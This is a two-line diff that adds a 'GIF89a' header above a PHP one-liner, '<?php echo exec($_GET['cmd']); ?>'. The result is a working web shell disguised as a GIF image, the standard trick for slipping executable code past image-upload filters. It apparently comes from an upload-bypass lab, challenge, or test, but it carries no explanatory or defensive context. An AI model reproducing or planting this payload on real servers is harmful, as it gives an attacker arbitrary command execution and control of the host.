@@ -1,2 +1,2 @@
-123
+GIF89a
 <?php echo exec($_GET['cmd']); ?>
